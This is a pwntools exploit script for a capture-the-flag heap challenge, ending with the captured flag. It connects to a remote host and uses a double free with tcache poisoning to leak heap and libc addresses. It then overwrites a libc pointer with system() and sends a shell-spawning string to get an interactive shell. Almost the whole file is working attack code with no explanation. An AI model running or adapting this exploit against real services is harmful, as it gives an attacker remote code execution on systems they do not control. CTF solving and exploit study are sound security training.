import os
from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

libc=ELF('./libc-2.27.so')

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('./Pwn', os.F_OK): os.mkdir('./Pwn')
            path = './Pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

elf=change_ld('./pwn','./ld-2.27.so')
#io = elf.process(env={'LD_PRELOAD':'./libc-2.27.so'})
io=remote('124.70.197.50',9010)


def add(idx,name,s):
    io.recvuntil('choice:')
    io.sendline('1')
    io.recvuntil('id:')
    io.sendline(str(idx))
    io.recvuntil('name:')
    io.sendline(name)
    io.recvuntil('score:')
    io.sendline(str(s))

def free(idx):
    io.recvuntil('choice:')
    io.sendline('3')
    io.recvuntil('id:')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('choice:')
    io.sendline('2')
    io.recvuntil('id:')
    io.sendline(str(idx))


add(0,'a',0)
add(1,'a',0)
add(2,'a',0)
add(3,'a',0)
add(4,'a',0)
add(5,'a',0)

free(0)
free(0)
free(0)
show(0)
io.recvuntil('score:')
heap=int(io.recvline())+0x20
add(6,'\x91',heap)
add(0,'\x31',0)
add(8,'aaa',0)
free(8)
free(8)
free(8)
free(8)
free(heap)
free(heap)

add(9,'\x91',heap)
add(heap,'\x91',0)
add(10,'aaa',0)
[free(10) for i in range(8)]
show(10)

io.recvuntil('score:')
libc_base=int(io.recvline())-0x3ebca0
p=libc_base+0x3eb120
env=libc_base+libc.sym['__environ']
sys=libc_base+libc.sym['system']
print(hex(libc_base))
print(hex(sys))

free(libc_base+0x3ebca0)
add(p+0x20,'aaa',env-0x23)
add(11,'aa',env-0x23)
#gdb.attach(io)
add(0xdead,"';sh",sys)


io.interactive()



#GACTF{95ba021db71613e9b2918c174f782f56_hijack_io_file_is_very_useful}




